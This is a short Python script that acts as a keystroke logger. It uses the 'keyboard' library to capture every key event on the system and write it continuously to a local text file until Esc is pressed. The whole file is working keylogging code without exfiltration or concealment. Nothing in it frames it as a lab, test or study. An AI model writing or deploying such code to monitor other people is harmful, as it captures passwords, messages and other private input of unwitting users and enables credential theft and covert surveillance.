import keyboard
import sys

def main():
    log_file = "keystroke_log.txt"
    
    with open(log_file, 'w') as f:
        try:
            while True:
                key = keyboard.read_event()
                if key.name == 'esc':
                    break
                else:
                    f.write(str(key))
                    f.flush()
        except Exception as e:
            print("Error occurred: ", str(e), file=sys.stderr)
            sys.exit(1)

if __name__ == "__main__":
    main()